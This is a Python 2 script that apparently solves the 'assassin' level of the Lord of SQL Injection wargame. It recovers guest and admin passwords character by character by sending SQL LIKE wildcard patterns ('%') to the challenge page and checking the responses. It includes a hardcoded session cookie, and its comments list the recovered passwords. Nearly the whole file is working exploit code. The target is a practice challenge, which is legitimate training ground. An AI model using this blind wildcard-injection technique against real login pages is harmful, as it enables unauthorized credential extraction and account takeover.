import requests


guest_pw = ""
guest_tmp_pw = ""
admin_pw = ""
tmp = ""
#admin_tmp_pw=""
#i=0
url = "http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php"

headers = {
    "Cookie": "PHPSESSID=pkpf9vsq7hhb1tu5lg6dlpomf7"
}

#guest pw 90D2FE10
#admin pw 902efd10

# Find guest pw first character
for i in range(0x30, 0x3a):
    params = {
        "pw":chr(i)+"%"
    }
    print "Try guest pw first character : %c" % chr(i)
    res = requests.get(url, params=params, headers=headers)
    if "Hello guest" in res.content:
        print "Find It! Guest PW first character",chr(i)
        guest_pw = guest_pw+chr(i)
        break


# Find guest pw
while True:
    for i in range(0x20, 0x7f):
        # # ! % ' " _ 
        if  "'" == chr(i) or '%' == chr(i):
            continue

        guest_tmp_pw = guest_pw+chr(i)+"%"
        params = {
            "pw":guest_tmp_pw
        }

        try:
            res = requests.get(url, headers=headers, params=params)
            print "Try Find Guest PW char %c" % chr(i)
            if "Hello guest" in res.content:
                print "Found It!!", chr(i)
                guest_pw = guest_pw + chr(i) 
                print "pw:",guest_pw
                break        
        except Exception as e:
                i = i-0x01
    if len(guest_pw) == 8:
        break

print "GUEST PASSWORD:",guest_pw


# Found some charactor of admin password
find = 0
for i in range(0,8):
    tmp = tmp+guest_pw[i]
    for j in range(0x20, 0x7f):

        if  "'" == chr(j) or '%' == chr(j) or '_' == chr(j):
            continue

        params = {
            "pw":tmp+chr(j)+"%"
        }

        print "Try:",tmp+chr(j)+"%"
        
        try:
            res = requests.get(url, headers=headers, params=params)
        except Exception as e:
            j = j-0x1
            continue

        if "Hello admin" in res.content:
            print tmp+chr(j)+"~~~~~~~~~~~~~~~~~~~~"
            admin_pw = tmp+chr(j)
            find = 1
            break
    if find == 1:
        break


# Find admin password 
# 902efd10
for i in range(len(admin_pw)+1,9):
    for j in range(0x20, 0x7f):
        if  "'" == chr(j) or '%' == chr(j) or '_' == chr(j):
            continue
        
        tmp = admin_pw+chr(j)
        params = {
            "pw":tmp+"%"
        }
        try:
            res = requests.get(url, headers=headers, params=params)
        except Exception as e:
            j = j-0x1
            continue
        
        if "Hello admin" in res.content:
            print "Found It!", chr(j)
            admin_pw = admin_pw+chr(j)
            print admin_pw
            break

print "assassin admin password:",admin_pw.lower()